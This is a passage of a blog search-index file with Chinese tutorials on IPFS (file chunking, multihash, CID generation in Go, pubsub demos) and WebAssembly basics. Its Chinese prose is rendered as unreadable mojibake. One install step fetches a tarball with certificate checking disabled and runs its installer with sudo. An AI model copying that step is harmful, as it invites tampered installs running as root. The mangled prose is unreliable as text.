","date":"2022-11-30","objectID":"/solidity_fallback_receive_function/:4:0","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­çš„fallbackå’Œreceiveå‡½æ•°","uri":"/solidity_fallback_receive_function/"},{"categories":["Blockchain"],"content":"IPFS åŸºç¡€çŸ¥è¯† ","date":"2022-10-24","objectID":"/ipfs/:0:0","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"ä»€ä¹ˆæ˜¯IPFS ç›¸æ¯”äºä»¥å‰çš„æœ¬åœ°å­˜å‚¨, æˆ‘ä»¬ç°åœ¨æ›´å–œæ¬¢ä½¿ç”¨äº‘å­˜å‚¨, äº‘å­˜å‚¨æ˜¯ç”±äº‘å­˜å‚¨æä¾›å•†æä¾›çš„é›†ä¸­å¼å­˜å‚¨, å…¶æœ‰å¾ˆå¤šä¼˜ç‚¹, æ¯”å¦‚ç”¨æˆ·ä½¿ç”¨èµ·æ¥ç®€å•,æä¾›æ•°æ®ä¿æŠ¤ç­‰, ä½†çŸ­æ¿ä¹Ÿå¾ˆæ˜æ˜¾, æ¯”å¦‚å¯è®¿é—®æ€§ã€ä¿å¯†æ€§ã€ä¿¡ä»»ã€ä»¥åŠæŠ—å®¡æŸ¥èƒ½åŠ›å¼±ç­‰é—®é¢˜ã€‚é’ˆå¯¹è¿™äº›é—®é¢˜ï¼Œ ä¾¿å‡ºç°äº†P2Pæ•°æ®ç½‘ç»œï¼Œå¤§å®¶å°è±¡æœ€æ·±åˆ»çš„ä¾¿æ˜¯BTä¸‹è½½ã€‚ å…³äºP2Pæ•°æ®ç½‘ç»œï¼Œ å‚è€ƒè¿™é‡Œ ï¼š https://yinhui1984.github.io/p2p/ IPFS å±äºæ–°ä¸€ä»£P2Pæ•°æ®ç½‘ç»œä¹‹ä¸€ï¼ˆè¿˜æœ‰ Swarmã€SAFEã€Storjç­‰ç­‰ï¼‰ï¼Œé‡‡ç”¨å®˜æ–¹çš„è§£é‡Šæ˜¯ â€œIPFS is a distributed system for storing and accessing files, websites, applications, and data.â€ å¦å¤–ï¼Œ ä»åŒºå—é“¾çš„è§’åº¦è¯´ï¼Œ å°†æ•°æ®æ”¾åœ¨è¯¸å¦‚ETHè¿™æ ·çš„é“¾ä¸Šä»£ä»·æ˜¯æ˜‚è´µçš„ï¼Œå¯¹åº”å¤§å‹æ•°æ®ä¹Ÿæ˜¯ä¸ç°å®çš„ï¼Œ æ‰€ä»¥éœ€è¦ä¸€ä¸ªç³»ç»Ÿæ¥è§£å†³Dappçš„æ•°æ®å­˜å‚¨é—®é¢˜ï¼Œ æ­£å¦‚ç¼–å†™ä¼ ç»ŸAPPéœ€è¦æœ‰æ•°æ®åº“ä¸€æ ·ã€‚ ","date":"2022-10-24","objectID":"/ipfs/:1:0","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"IPFSåˆè¯† ","date":"2022-10-24","objectID":"/ipfs/:2:0","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"å®‰è£…ä¸å¯åŠ¨ é¦–å…ˆå®‰è£…IPFS Desktop å’Œ CLIï¼š https://docs.ipfs.tech/install/ å‘½ä»¤è¡Œå®‰è£…ï¼š \u003e wget --no-check-certificate https://dist.ipfs.tech/kubo/v0.16.0/kubo_v0.16.0_linux-amd64.tar.gz \u003e tar -xvzf kubo_v0.16.0_linux-amd64.tar.gz \u003e cd kubo \u0026\u0026 sudo bash install.sh åˆå§‹åŒ– \u003e ipfs init å¯åŠ¨èŠ‚ç‚¹ \u003e ipfs daemon æŸ¥çœ‹èŠ‚ç‚¹ä¿¡æ¯ \u003e ipfs id -f=\"\u003cid\u003e\" 12D3KooWJdT87m7RVHHwYmvTzhitNhuG9eVBJB5EiQeCGcR13aHE å¯ä»¥åœ¨å¦å¤–ä¸€å°ç”µè„‘æˆ–è™šæ‹Ÿæœºä¸Šä½¿ç”¨ipfs ping \u003cid\u003e æ¥å°è¯•pingè¿™ä¸ªid âœ ~ ipfs ping 12D3KooWJdT87m7RVHHwYmvTzhitNhuG9eVBJB5EiQeCGcR13aHE PING 12D3KooWJdT87m7RVHHwYmvTzhitNhuG9eVBJB5EiQeCGcR13aHE. Pong received: time=0.66 ms ... å°è¯•è¿æ¥: âœ ~ ipfs swarm connect /ipfs/12D3KooWJdT87m7RVHHwYmvTzhitNhuG9eVBJB5EiQeCGcR13aHE connect 12D3KooWJdT87m7RVHHwYmvTzhitNhuG9eVBJB5EiQeCGcR13aHE success ","date":"2022-10-24","objectID":"/ipfs/:2:1","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ æˆ‘ä»¬ä½¿ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬ç”Ÿæˆä¸€ä¸ªå¤§äº256Kçš„æ–‡ä»¶,ç„¶åä¸Šä¼ åˆ°IPFS #!/usr/bin/env sh TEXTFILE=./text.txt TRUE \u003e $TEXTFILE counter=0 # while size of text.txt \u003c 300k, write content into it # get size of text.txt # linux: stat -c%s \"$FILENAME\" # macos: stat -f%z \"$FILENAME\" FILESIZE=$(stat -f%z \"$TEXTFILE\") LINE=\"########################################################\" while [ \"$FILESIZE\" -lt 307200 ]; do echo ${counter}$LINE \u003e\u003e ./text.txt counter=$((counter+1)) FILESIZE=$(stat -f%z \"$TEXTFILE\") done OSX MP16 ~/Desktop/ipfs_demo â¯ ipfs add ./local_file/text.txt added QmPLXXaC81eGS3fNoCkvaqaRPFRu9pUCQMbKvajo9co1ND text.txt 300.04 KiB / 300.04 KiB [=========================] 100.00% ä¸Šä¼ å®Œæˆå, å…¶ä¼šç»™å‡ºä¸€ä¸ªåœ°å€å­—ç¬¦ä¸², å«ç€ CID (conent id). å¯ä»¥ç†è§£ä¸ºè¯¥æ–‡ä»¶çš„hashå€¼, ä½†ä¸ä»…ä»…å¦‚æ­¤. å‚è€ƒè¿™é‡Œ: https://docs.ipfs.tech/concepts/content-addressing/#cid-versions ä½¿ç”¨ipfs cat å‘½ä»¤å¯ä»¥å°†å†…å®¹æ‰“å°å‡ºæ¥: âœ ~ ipfs cat QmPLXXaC81eGS3fNoCkvaqaRPFRu9pUCQMbKvajo9co1ND 0######################################################## 1######################################################## 2######################################################## 3######################################################## ... ... 5051######################################################## 5052######################################################## 5053######################################################## 5054######################################################## âœ ~ ä½¿ç”¨ipfs lså‘½ä»¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ° è¿™ä¸ªCIDåˆæŒ‡å‘å¦å¤–2ä¸ªCID OSX MP16 ~ â¯ ipfs ls -v QmPLXXaC81eGS3fNoCkvaqaRPFRu9pUCQMbKvajo9co1ND Hash Size Name QmaroDZbcMjim4a8nVyahnvb3hhCSSTsCZB2jCJEsrd3ZF 262144 QmU6xSMhb74oxAXRjLVRwqsJJgU4GH14FDVME5qys8uFZF 45101 åˆ†åˆ«ipfs catå‡ºè¿™ä¸¤ä¸ªCID, çœ‹çœ‹å…¶ä¸­çš„å†…å®¹: OSX MP16 ~ â¯ ipfs cat QmaroDZbcMjim4a8nVyahnvb3hhCSSTsCZB2jCJEsrd3ZF 0######################################################## 1######################################################## 2######################################################## 3######################################################## 4######################################################## ... ... 4312######################################################## 4313######################################################## 4314######################################################## 4315################################### OSX MP16 ~ â¯ OSX MP16 ~ â¯ ipfs cat QmU6xSMhb74oxAXRjLVRwqsJJgU4GH14FDVME5qys8uFZF ##################### 4316######################################################## 4317######################################################## 4318######################################################## 4319######################################################## 4320######################################################## ... ... 5051######################################################## 5052######################################################## 5053######################################################## 5054######################################################## å¾ˆæ˜æ˜¾çš„, æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è¢«åˆ†æˆäº†2ä¸ªéƒ¨åˆ†,åˆ†åˆ«å­˜å‚¨äº†. è¿™æ¶‰åŠåˆ°2ä¸ªçŸ¥è¯†: IPFSçš„æ–‡ä»¶å­˜å‚¨æ˜¯åˆ†å—(Block)å­˜å‚¨çš„, ä¸€ä¸ªå—æœ€å¤§å®¹é‡æ˜¯256KB IPFSä½¿ç”¨çš„æ˜¯é»˜å…‹å°”æ ‘çš„å½¢å¼æ¥è¿›è¡Œå­˜å‚¨çš„ åˆ° IPFS Desktopä¸Šçœ‹å°±æ›´å½¢è±¡äº† åœ¨å…¬å…±ç½‘å…³ä¸ŠæŸ¥çœ‹ ipfs å†…å®¹èƒ½åœ¨æœ¬åœ°çœ‹åˆ°, ä½†æ— æ³•åœ¨å…¬å…±ç½‘å…³ä¸Šçœ‹åˆ° ? æ·»åŠ é…ç½®: ipfs config --json Swarm.RelayClient.Enabled true é‡å¯ipfs ipfs shutdown ipfs daemon https://ipfs.io/ipfs/QmPLXXaC81eGS3fNoCkvaqaRPFRu9pUCQMbKvajo9co1ND ","date":"2022-10-24","objectID":"/ipfs/:2:2","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"ç†è®ºåŸºç¡€ ","date":"2022-10-24","objectID":"/ipfs/:3:0","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"Hash Hashå‡½æ•°åœ¨https://yinhui1984.github.io/pow/#hash ä¸­è¯´è¿‡. ä½†é‚£é‡Œæ²¡æœ‰æåŠHashé¢ä¸´çš„é—®é¢˜: å“ˆå¸Œç®—æ³•å¾ˆå¤š, ä¸åŒçš„è½¯ä»¶å¯èƒ½é‡‡ç”¨ä¸åŒçš„ç®—æ³•, å¹¶ä¸”ç®—æ³•è¾“å‡ºçš„å“ˆå¸Œå€¼é•¿åº¦ä¹Ÿä¸ä¸€æ · éšç€æ—¶é—´çš„æ¨ç§», æŸä¸€äº›å“ˆå¸Œç®—æ³•å¯èƒ½ä¼šè¢«å‘ç°å­˜åœ¨ä¸å®‰å…¨å› ç´ è€Œè¢«å¼ƒç”¨è€Œé‡‡å–å…¶ä»–çš„ç®—æ³•,æˆ–è¿›è¡Œå‡çº§ è¿™å°±å¯¼è‡´åœ¨ç¼–å†™å“ˆå¸Œè§£ç ç¨‹åºçš„æ—¶å€™, ä¸€ä¸ªç¨‹åºä¼šé¢å¯¹å¾ˆå¤šç§ç®—æ³•, è¿™åœ¨å…¼å®¹æ€§å’Œç®—æ³•å‡çº§ä¸Šæ˜¯å¾ˆç—›è‹¦çš„. mutihash (èšåˆå“ˆå¸Œ) é’ˆå¯¹ä¸Šé¢çš„é—®é¢˜, æå‡ºäº†mutihash https://multiformats.io/multihash/ åŸºæœ¬åŸç†å°±æ˜¯åœ¨hashå€¼å‰é¢åŠ ä¸Šå“ˆå¸Œç®—æ³•ç±»å‹å’Œå“ˆå¸Œå€¼é•¿åº¦è¿™æ ·ä¸¤ä¸ªå‰ç¼€ \u003chash-func-type\u003e\u003cdigest-length\u003e\u003cdigest-value\u003e å®Œæ•´ç±»å‹åˆ—è¡¨åœ¨è¿™é‡Œ : https://github.com/multiformats/multicodec/blob/master/table.csv name tag code status description â€¦ sha2-256 multihash 0x12 permanent â€¦ æ¯”å¦‚ \"12200ED3911004C0EF2CC63ADCDC9E44CD8C2C831EEC0E4431402000F5325A7FE1AE\" å°±è¡¨ç¤ºç±»å‹æ˜¯0x12, ä¹Ÿå°±æ˜¯sha2-256, é•¿åº¦ä¸º0x20 = 32Byte = 256bit , å“ˆå¸Œå€¼ä¸º 0ED3911004C0EF2CC63ADCDC9E44CD8C2C831EEC0E4431402000F5325A7FE1AE ä¸¾ä¾‹ OSX MP16 ~ â¯ cat ./hello.txt helloworld OSX MP16 ~ â¯ ipfs add ./hello.txt added QmUU2HcUBVSXkfWPUc3WUSeCMrWWeEJTuAgR9uyWBhh9Nf hello.txt 11 B / 11 B [==============] 100.00 ç‚¹å‡»IPFS Desktop æ–‡ä»¶ -\u003e å¯¼å…¥(æ¥è‡ªIPFSè·¯å¾„) æŒ‰é’®, å¯¼å…¥ä¸Šé¢çš„CID, ç„¶ååœ¨å¯¼å…¥çš„é¢˜ç›®ä¸Šé€‰æ‹©\"æ£€æŸ¥\" æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶é‡‡ç”¨çš„æ˜¯sha2-256çš„å“ˆå¸Œç®—æ³• æˆ‘ä»¬å¯¼å‡ºè¯¥æ•°æ®å—(block), æ‰‹åŠ¨ä½¿ç”¨sha2-256æ¥çœ‹çœ‹å…¶hashå€¼æ˜¯å¦å¦‚æ­¤: ~â¯ ipfs block get QmUU2HcUBVSXkfWPUc3WUSeCMrWWeEJTuAgR9uyWBhh9Nf \u003e hello.block ~â¯ sha256sum ./hello.block 5b0995ced69229d26009c53c185a62ea805a339383521edbed1028c496615448 ./hello.block æ³¨æ„: ç›´æ¥å¯¹./hello.txt è¿›è¡Œhashå¾—åˆ°çš„å€¼æ˜¯ä¸åŒçš„ ~â¯ sha256sum ./hello.txt 8cd07f3a5ff98f2a78cfc366c13fb123eb8d29c1ca37c79df190425d5b9e424d ./hello.txt è¿™æ˜¯ä¸ºä»€ä¹ˆ? è¿™æ˜¯å› ä¸ºIPFSåœ¨å­˜å‚¨hello.txtä¸­çš„å†…å®¹æ—¶,è¿˜æ·»åŠ äº†å…¶ä»–ä¿¡æ¯, å…¶å’Œæ•°æ®ä¿¡æ¯ä¸€èµ·ä½œä¸º\"å—çš„å†…å®¹\"è¢«å­˜å‚¨èµ·æ¥çš„ ","date":"2022-10-24","objectID":"/ipfs/:3:1","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"CID å…³äºCIDçš„ä»‹ç»å‚è€ƒè¿™é‡Œ : https://docs.ipfs.tech/concepts/content-addressing/#what-is-a-cid ä»¥åŠå®˜æ–¹æ•™ç¨‹: https://proto.school/anatomy-of-a-cid æˆ‘ä»¬è¿™é‡Œä»¥CID v0ä¸ºä¾‹, çœ‹çœ‹IPFSæ˜¯å¦‚ä½•ç”ŸæˆCIDçš„ å¯¼å‡ºCIDä¸º QmUU2HcUBVSXkfWPUc3WUSeCMrWWeEJTuAgR9uyWBhh9Nf ä¸€ä¸ªå—: ~ \u003e ipfs block get QmUU2HcUBVSXkfWPUc3WUSeCMrWWeEJTuAgR9uyWBhh9Nf \u003e hello.block IPFS ç”ŸæˆCID v0çš„æ­¥éª¤ : 1, å°†å—æ•°æ®è¿›è¡Œä¸€æ¬¡sha256 å“ˆå¸Œ, å¾—åˆ°H1 2, åœ¨H1å‰é¢è¿½åŠ å“ˆå¸Œç®—æ³•ç±»å‹å’ŒH1å“ˆå¸Œé•¿åº¦ å¾—åˆ° S 3, å°†Sè¿›è¡Œä¸€æ¬¡base58ç¼–ç  package main import ( \"crypto/sha256\" \"fmt\" \"github.com/mr-tron/base58/base58\" \"os\" ) func main() { bytes, _ := os.ReadFile(\"hello.block\") s := sha256.Sum256(bytes) //0x12 è¡¨ç¤º sha256 //https://github.com/multiformats/multicodec/blob/master/table.csv //0x20 è¡¨ç¤º 32Byte s1 := append([]byte{0x12, 0x20}, s[:]...) output := base58.Encode(s1[:]) fmt.Println(\"MY CID: \", output) } OSX MP16 ~/Desktop/ipfs_demo/cid_demo â¯ go run . MY CID: QmUU2HcUBVSXkfWPUc3WUSeCMrWWeEJTuAgR9uyWBhh9Nf OSX MP16 ~/Desktop/ipfs_demo/cid_demo â¯ ä¸€ä¸ªåœ¨çº¿çš„CIDæŸ¥çœ‹å™¨: https://cid.ipfs.tech/#QmUU2HcUBVSXkfWPUc3WUSeCMrWWeEJTuAgR9uyWBhh9Nf é€šç”¨çš„ç”ŸæˆCIDçš„ä»£ç å¦‚ä¸‹: https://github.com/ipfs/go-cid package main import ( \"fmt\" \"github.com/ipfs/go-cid\" mc \"github.com/multiformats/go-multicodec\" mh \"github.com/multiformats/go-multihash\" \"os\" ) func main() { bytes, _ := os.ReadFile(\"hello.block\") pref := cid.Prefix{ //è¿™é‡ŒæŒ‡å®š CID version Version: 0, Codec: uint64(mc.Raw), //è¿™é‡ŒæŒ‡å®šå“ˆå¸Œç®—æ³• MhType: mh.SHA2_256, MhLength: -1, // default length } c, err := pref.Sum(bytes) if err != nil { panic(err) } fmt.Println(\"Created CID: \", c) } å…¶ä»–ç¼–ç¨‹è¯­è¨€çš„CIDå®ç°åœ¨è¿™é‡Œ : https://github.com/multiformats/cid#implementations ","date":"2022-10-24","objectID":"/ipfs/:3:2","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"é»˜å…‹å°”æœ‰å‘æ— ç¯å›¾(Merkle DAG) å‚è€ƒè¿™ç¯‡æ–‡ç« , å†™å¾—éå¸¸è¯¦ç»† https://developer.aliyun.com/article/842854 ","date":"2022-10-24","objectID":"/ipfs/:3:3","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"åˆ†å¸ƒå¼å“ˆå¸Œè¡¨ DHT è¿™ä¸ªè§†é¢‘ https://www.bilibili.com/video/BV1bA411q73K/ ä»¥åŠ https://learnblockchain.cn/article/3443 ","date":"2022-10-24","objectID":"/ipfs/:3:4","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"æ¶ˆæ¯æœåŠ¡(pubsub) æä¾›æ¶ˆæ¯å‘å¸ƒå’Œè®¢é˜…æœåŠ¡ åœ¨å¯åŠ¨ipfs deamonæ˜¯éœ€è¦å¸¦ä¸Š --enable-pubsub-experiment å‚æ•° ","date":"2022-10-24","objectID":"/ipfs/:4:0","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"demo è®¢é˜…æ¶ˆæ¯demo package main import ( ipfs \"github.com/ipfs/go-ipfs-api\" \"log\" ) func main() { log.SetFlags(log.LstdFlags | log.Lshortfile) shell := ipfs.NewShell(\"localhost:5001\") if shell == nil { log.Fatal(\"Failed to connect to IPFS\") } //Run daemon with --enable-pubsub-experiment to use. subscribe, err := shell.PubSubSubscribe(\"topic_test\") if err != nil { log.Fatal(\"Failed to subscribe topic, \", err) } for true { msg, err := subscribe.Next() if err != nil { log.Println(\"error when get next message, \", err) continue } log.Printf(\"got message:\\n\\t%v\\n \\tdata:%s\\n\\tfrom:%s\\n\", msg.TopicIDs, msg.Data, msg.From.String()) } } å‘å¸ƒæ¶ˆæ¯demo: package main import ( ipfs \"github.com/ipfs/go-ipfs-api\" \"log\" \"time\" ) func main() { log.SetFlags(log.LstdFlags | log.Lshortfile) shell := ipfs.NewShell(\"localhost:5001\") if shell == nil { log.Fatal(\"Failed to connect to IPFS\") } //Run daemon with --enable-pubsub-experiment to use. for true { msg := \"hello,current time is:\" + time.Now().String() err := shell.PubSubPublish(\"topic_test\", msg) if err != nil { log.Println(\"Error when publish message: \", err) } log.Println(\"sent msg: \" + msg) time.Sleep(time.Second) } } å¯åŠ¨èŠ‚ç‚¹: ipfs daemon --enable-pubsub-experiment ç”¨ä¸¤å°ç”µè„‘, ä¸€ä¸ªè¿è¡Œå‘å¸ƒè€…å¦å¤–ä¸€ä¸ªè¿è¡Œè®¢é˜…è€…: ","date":"2022-10-24","objectID":"/ipfs/:4:1","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"API https://docs.ipfs.tech/reference/#api-cli-reference ä¸€ä¸ªæœ€åŸºç¡€çš„ç¤ºä¾‹: package main import ( \"fmt\" ipfs \"github.com/ipfs/go-ipfs-api\" \"io\" \"log\" \"strings\" ) func main() { log.SetFlags(log.LstdFlags | log.Lshortfile) shell := ipfs.NewShell(\"localhost:5001\") if shell == nil { log.Fatal(\"Failed to connect to IPFS\") } log.Println(\"IPS connected\") // ä¸Šä¼  //addçš„å†…å®¹é»˜è®¤æ˜¯è¢«pinåœ¨æœ¬åœ°çš„ cid, err := shell.Add(strings.NewReader(\"HELLO!!\")) if err != nil { log.Fatal(\"Add error:\", err) } log.Println(\"Success added in IPFS: \", cid) //ä¸‹è½½ log.Println(\"Getting content from IPFS\") reader, err := shell.Cat(cid) if err != nil { log.Fatal(err) } content, err := io.ReadAll(reader) if err != nil { log.Fatal(err) } fmt.Println(string(content)) } ","date":"2022-10-24","objectID":"/ipfs/:5:0","tags":["IPFS","L1","Web3.0"],"title":"IPFS","uri":"/ipfs/"},{"categories":["Blockchain"],"content":"WebAssembly ç›¸å…³ ","date":"2022-10-11","objectID":"/webassembly/:0:0","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"WebAssembly æ˜¯ä»€ä¹ˆ ","date":"2022-10-11","objectID":"/webassembly/:1:0","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"å®šä¹‰ æ¥è‡ªMDNçš„è§£é‡Š: WebAssembly æ˜¯ä¸€ç§æ–°å‹ä»£ç ï¼Œå¯ä»¥åœ¨ç°ä»£ Web æµè§ˆå™¨ä¸­è¿è¡Œï¼Œå¹¶æä¾›æ–°åŠŸèƒ½å’Œä¸»è¦æ€§èƒ½æå‡ã€‚å®ƒçš„ä¸»è¦ç›®çš„ä¸æ˜¯æ‰‹å†™ï¼Œè€Œæ˜¯è®¾è®¡ä¸º Cã€C++ã€Rust ç­‰æºè¯­è¨€çš„æœ‰æ•ˆç¼–è¯‘ç›®æ ‡ã€‚ è¿™å¯¹ Web å¹³å°æœ‰ç€å·¨å¤§çš„å½±å“â€”â€”å®ƒæä¾›äº†ä¸€ç§åœ¨ Web ä¸Šä»¥æ¥è¿‘æœ¬æœºçš„é€Ÿåº¦è¿è¡Œä»¥å¤šç§è¯­è¨€ç¼–å†™çš„ä»£ç çš„æ–¹æ³•ï¼Œè€Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºå¯ä»¥åœ¨ Web ä¸Šè¿è¡Œï¼Œè€Œè¿™æ˜¯ä»¥å‰æ— æ³•åšåˆ°çš„ã€‚ æ›´é‡è¦çš„æ˜¯ï¼Œæ‚¨ç”šè‡³ä¸å¿…çŸ¥é“å¦‚ä½•åˆ›å»º WebAssembly ä»£ç æ¥åˆ©ç”¨å®ƒã€‚ WebAssembly æ¨¡å—å¯ä»¥å¯¼å…¥åˆ° Webï¼ˆæˆ– Node.jsï¼‰åº”ç”¨ç¨‹åºä¸­ï¼Œå…¬å¼€ WebAssembly å‡½æ•°ä»¥é€šè¿‡ JavaScript ä½¿ç”¨ã€‚ JavaScript æ¡†æ¶å¯ä»¥åˆ©ç”¨ WebAssembly æ¥æä¾›å·¨å¤§çš„æ€§èƒ½ä¼˜åŠ¿å’Œæ–°åŠŸèƒ½ï¼ŒåŒæ—¶ä»ç„¶ä½¿ Web å¼€å‘äººå‘˜å¯ä»¥è½»æ¾ä½¿ç”¨è¿™äº›åŠŸèƒ½ã€‚ æ¥è‡ªwebassembly.orgçš„è§£é‡Š: WebAssemblyï¼ˆç¼©å†™ä¸ºWasmï¼‰æ˜¯ä¸€ç§åŸºäºå †æ ˆçš„è™šæ‹Ÿæœºçš„äºŒè¿›åˆ¶æŒ‡ä»¤æ ¼å¼ã€‚Wasmè¢«è®¾è®¡ä¸ºç¼–ç¨‹è¯­è¨€çš„å¯ç§»æ¤ç¼–è¯‘ç›®æ ‡ï¼Œèƒ½å¤Ÿåœ¨ç½‘ç»œä¸Šéƒ¨ç½²å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åº”ç”¨ç¨‹åºã€‚ é€šè¿‡ä¸Šé¢çš„è§£é‡Š, æˆ‘ä»¬å¤§æ¦‚å¯ä»¥çŸ¥é“ä¸€ä¸‹å‡ ç‚¹: WASMå¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¿è¡Œ WASMå¯ä»¥åœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šè¿è¡Œ WASMæ˜¯é€šè¿‡é«˜çº§è¯­è¨€è¿›è¡Œç¼–è¯‘å¾—åˆ°çš„ä¸€ç§äºŒè¿›åˆ¶æ ¼å¼ WASMå¯ç”¨ä½¿ç”¨å„å¼å„æ ·ä½ æ‹¿æ‰‹çš„é«˜çº§è¯­è¨€è¿›è¡Œä»£ç ç¼–å†™, ç„¶åå†ç¼–è¯‘è€Œæˆ WASMæ€§èƒ½å¾ˆæ£’ WASMå¯ä»¥å’ŒJSæ··ç”¨ WASMå¯ç§»æ¤æ€§å¾ˆå¼º æœ‰ä¸€ä¸ªåŸºäºå †æ ˆçš„è™šæ‹Ÿæœº(Stack Based VM) ","date":"2022-10-11","objectID":"/webassembly/:1:1","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"ç›®æ ‡ æ¥è‡ª(https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts#webassembly_goals):https://webassembly.github.io/spec/core/intro/introduction.html WebAssemblyçš„è®¾è®¡ç›®æ ‡å¦‚ä¸‹ å¿«é€Ÿã€å®‰å…¨ã€ä¾¿æº: Fast: ä»¥æ¥è¿‘åŸç”Ÿä»£ç çš„æ€§èƒ½æ‰§è¡Œï¼Œåˆ©ç”¨æ‰€æœ‰å½“ä»£ç¡¬ä»¶çš„å…±åŒèƒ½åŠ›ã€‚ Safe: ä»£ç è¢«éªŒè¯å¹¶åœ¨å†…å­˜å®‰å…¨2ã€æ²™ç›’ç¯å¢ƒä¸­æ‰§è¡Œï¼Œé˜²æ­¢æ•°æ®æŸåæˆ–å®‰å…¨æ¼æ´ã€‚ Well-defined: ä»¥ä¸€ç§æ˜“äºéæ­£å¼å’Œæ­£å¼æ¨ç†çš„æ–¹å¼ï¼Œå……åˆ†è€Œç²¾ç¡®åœ°å®šä¹‰äº†æœ‰æ•ˆçš„ç¨‹åºåŠå…¶è¡Œä¸ºã€‚ Hardware-independent: å¯ä»¥åœ¨æ‰€æœ‰ç°ä»£æ¶æ„ã€æ¡Œé¢æˆ–ç§»åŠ¨è®¾å¤‡ä»¥åŠåµŒå…¥å¼ç³»ç»Ÿä¸Šç¼–è¯‘ã€‚ Language-independent: ä¸å¯¹ä»»ä½•ç‰¹å®šçš„è¯­è¨€ã€ç¼–ç¨‹æ¨¡å‹æˆ–å¯¹è±¡æ¨¡å‹ç»™äºˆç‰¹æƒã€‚ Platform-independent: å¯ä»¥åµŒå…¥åˆ°æµè§ˆå™¨ä¸­ï¼Œä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿæœºè¿è¡Œï¼Œæˆ–é›†æˆåˆ°å…¶ä»–ç¯å¢ƒä¸­ã€‚ Open: ç¨‹åºèƒ½ä»¥ç®€å•å’Œé€šç”¨çš„æ–¹å¼ä¸ç¯å¢ƒäº’æ“ä½œã€‚ é«˜æ•ˆå’Œä¾¿æºçš„ä»£è¡¨: Compact: æœ‰ä¸€ç§äºŒè¿›åˆ¶æ ¼å¼ï¼Œæ¯”å…¸å‹çš„æ–‡æœ¬æˆ–æœ¬åœ°ä»£ç æ ¼å¼æ›´å°ï¼Œæ‰€ä»¥ä¼ è¾“é€Ÿåº¦å¿«ã€‚ Modular: ç¨‹åºå¯ä»¥è¢«åˆ†å‰²æˆè¾ƒå°çš„éƒ¨åˆ†ï¼Œå¯ä»¥åˆ†åˆ«è¿›è¡Œä¼ è¾“ã€ç¼“å­˜å’Œæ¶ˆè´¹ã€‚ Efficient: å¯ä»¥åœ¨ä¸€ä¸ªå¿«é€Ÿçš„å•ç¨‹ä¸­è¿›è¡Œè§£ç ã€éªŒè¯å’Œç¼–è¯‘ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨åŠæ—¶ç¼–è¯‘ï¼ˆJITï¼‰æˆ–é¢„å…ˆç¼–è¯‘ï¼ˆAOTï¼‰ã€‚ Streamable: å…è®¸åœ¨æ‰€æœ‰æ•°æ®è¢«çœ‹åˆ°ä¹‹å‰ï¼Œå°½å¿«å¼€å§‹è§£ç ã€éªŒè¯å’Œç¼–è¯‘ã€‚ Parallelizable: å…è®¸å°†è§£ç ã€éªŒè¯å’Œç¼–è¯‘åˆ†å‰²æˆè®¸å¤šç‹¬ç«‹çš„å¹¶è¡Œä»»åŠ¡ã€‚ Portable: ä¸åšä»»ä½•åœ¨ç°ä»£ç¡¬ä»¶ä¸­ä¸è¢«å¹¿æ³›æ”¯æŒçš„æ¶æ„å‡è®¾ã€‚ ","date":"2022-10-11","objectID":"/webassembly/:1:2","tags":["wasm","L0","Web3.0"],"title":"WebAssembly","uri":"/webassembly/"},{"categories":["Blockchain"],"content":"WebAssemblyåˆ°åº•é•¿å•¥æ · ä¸Šé¢çš„å®šä¹‰å’Œç›®æ ‡å¬èµ·æ¥éå¸¸çš„æŠ½è±¡, ä¸å¦‚ç”Ÿæˆä¸€ä¸ªWebAssemblyå¹¶ä½¿ç”¨ä¸€ä¸‹,æ¥å…·ä½“æ„Ÿå—ä¸€ä¸‹. æˆ‘ä»¬é€‰ç”¨Rustè¯­è¨€æ¥å†™ä¸€ä¸ªç®€å•çš„demo å…ˆæ ¹æ®å®˜ç½‘å®‰è£…Rust: https://www.rust-lang.org/learn/get-started fn main(){ println!(\"Hello, i'm Rust!\"); } ç”¨rustcç¼–è¯‘å™¨ç¼–è¯‘å’Œè¿è¡Œä¸€ä¸‹, æ²¡æœ‰ç‘•ç–µ: OSX MP16 ~/Dow/wasm_e/standalone â¯ rustc ./hello.rs -o hello.exe OSX MP16 ~/Dow/wasm_example/standalone â¯ ./hello.exe Hello, i'm Rust! 